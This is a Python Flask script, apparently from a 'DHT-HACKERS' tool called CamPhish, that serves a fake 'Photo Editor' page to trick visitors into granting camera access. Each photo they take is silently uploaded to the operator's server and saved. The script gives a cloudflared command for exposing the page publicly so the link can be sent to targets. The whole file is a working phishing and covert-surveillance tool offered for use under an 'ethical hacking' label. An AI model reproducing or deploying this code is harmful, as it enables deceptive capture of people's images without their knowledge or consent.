import os
import time
import pyfiglet
from flask import Flask, request, Response

# Define ANSI color codes
R = '\033[91m'  
G = '\033[92m'  
Y = '\033[93m'  
B = '\033[94m'  
P = '\033[95m'  
C = '\033[96m'  
W = '\033[97m'  
N = '\033[0m'   

clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')

def show_banner(text, color):
    clear()
    banner = pyfiglet.figlet_format(text, font="slant")  
    print(f"{color}{banner}{N}")

def dht_hackers_banner():
    show_banner("DHT-HACKERS", R)
    print(f"{C}────────────────────────────────────────────────────────────")
    print(f"{G} THIS TOOL IS PAID! TO USE IT FOR FREE:")
    print(f"{P} SUBSCRIBE TO OUR CHANNEL FOR ETHICAL HACKING TUTORIALS!")
    print(f"{B} 📌 https://youtube.com/@dht-hackers_10")
    print(f"{C}────────────────────────────────────────────────────────────{N}")
    time.sleep(2)
    os.system("termux-open-url https://youtube.com/@dht-hackers_10")
    input(f"{Y}Press Enter after subscribing to continue...{N}")
    clear()

def dht_camhunt_banner():
    show_banner("DHT-CAMHUNT", G)
    print(f"{C}────────────────────────────────────────────────────────────")
    print(f"{P}  🔥 Created by: {R}DHT-HACKERS 🔥")
    print(f"{B}  🎯 Ethical Hacking | Penetration Testing | Cybersecurity")
    print(f"{C}────────────────────────────────────────────────────────────{N}")

# Run banners
dht_hackers_banner()
dht_camhunt_banner()

# Display credits
print(f"{Y}⚡ Developed by: {G}DHT-HACKERS {N}")
print(f"{B}📌 Follow us for more: {P}https://youtube.com/@dht-hackers_10{N}")
print(f"{C}────────────────────────────────────────────────────────────{N}")

# Interactive menu for port selection
while True:
    try:
        port = input(f"{Y}Enter the port to start the server (default 8080): {N}")
        if port.strip() == "":
            port = 8080
        else:
            port = int(port)
        
        if 1024 <= port <= 65535:
            break
        else:
            print(f"{R}⚠️ Invalid port! Choose a port between 1024 and 65535.{N}")
    except ValueError:
        print(f"{R}⚠️ Invalid input! Please enter a valid port number.{N}")

app = Flask(__name__)

# Create folder for captured images
CAPTURED_DIR = "captured_images"
if not os.path.exists(CAPTURED_DIR):
    os.makedirs(CAPTURED_DIR)

# HTML & JavaScript Fake Camera Page
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Editor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #222;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: #333;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 4px 10px rgba(255, 255, 255, 0.1);
            width: 90%;
            max-width: 450px;
        }

        .title {
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(45deg, #ff6b6b, #feca57, #48dbfb, #1dd1a1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            display: inline-block;
            padding-bottom: 5px;
            text-transform: uppercase;
        }

        video, canvas, img {
            width: 100%;
            border-radius: 8px;
            margin-bottom: 10px;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            gap: 10px;
        }

        .btn {
            flex: 1;
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn:hover {
            background-color: #0056b3;
            transform: scale(1.05);
        }

        .slider-container {
            margin: 10px 0;
        }

        .hidden {
            display: none;
        }

        .download-btn {
            background-color: #28a745;
        }

        .download-btn:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2 class="title">🎨 Photo Editor</h2>
        <p>Capture an image and apply basic edits.</p>

        <video id="video" autoplay></video>
        <canvas id="canvas" class="hidden"></canvas>
        <img id="preview" class="hidden">

        <div class="buttons">
            <button class="btn" onclick="captureImage()">📸 Capture</button>
            <button class="btn download-btn hidden" id="downloadBtn" onclick="downloadImage()">⬇ Download</button>
        </div>

        <div class="slider-container hidden" id="editControls">
            <label>Brightness: <input type="range" id="brightness" min="50" max="200" value="100"></label>
            <label>Contrast: <input type="range" id="contrast" min="50" max="200" value="100"></label>
        </div>
    </div>

    <script>
        let video = document.getElementById("video");
        let canvas = document.getElementById("canvas");
        let context = canvas.getContext("2d");
        let preview = document.getElementById("preview");
        let brightness = document.getElementById("brightness");
        let contrast = document.getElementById("contrast");
        let editControls = document.getElementById("editControls");
        let downloadBtn = document.getElementById("downloadBtn");

        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; })
            .catch(err => { alert("⚠ Camera access denied!"); });

        function captureImage() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            let imageData = canvas.toDataURL("image/png");

            preview.src = imageData;
            preview.classList.remove("hidden");
            downloadBtn.classList.remove("hidden");
            editControls.classList.remove("hidden");

            applyFilters();

            // Send image to Flask server
            canvas.toBlob(blob => {
                let formData = new FormData();
                formData.append("webcam", blob, "image_" + Date.now() + ".jpg");

                fetch("/capture", { method: "POST", body: formData })
                    .then(response => response.text())
                    .then(data => console.log(data))
                    .catch(error => console.error("Error:", error));
            });
        }

        function applyFilters() {
            let brightnessValue = brightness.value;
            let contrastValue = contrast.value;
            preview.style.filter = `brightness(${brightnessValue}%) contrast(${contrastValue}%)`;
        }

        function downloadImage() {
            let a = document.createElement("a");
            a.href = preview.src;
            a.download = "edited_image.png";
            a.click();
        }

        brightness.addEventListener("input", applyFilters);
        contrast.addEventListener("input", applyFilters);
    </script>

</body>
</html>
"""

@app.route("/")
def home():
    return Response(HTML_PAGE, mimetype="text/html")

@app.route("/capture", methods=["POST"])
def capture():
    image = request.files.get("webcam")
    if image:
        image_path = os.path.join(CAPTURED_DIR, image.filename)
        image.save(image_path)
        return "✅ Image captured successfully!", 200
    return "❌ Failed to capture image", 400

if __name__ == "__main__":
    print("\n🚀 CamPhish is running! Open the link below in your browser:\n")
    print(f"{B}🔗 http://127.0.0.1:{port}/{N}")
    print("\n📂 Captured images are stored in:", CAPTURED_DIR)
    
    print(f"\n{Y}🌐 To make your link public, open a new session and run:{N}")
    print(f"{G}cloudflared tunnel --url http://localhost:{port}{N}")

    app.run(host="0.0.0.0", port=port)  # Open to local network
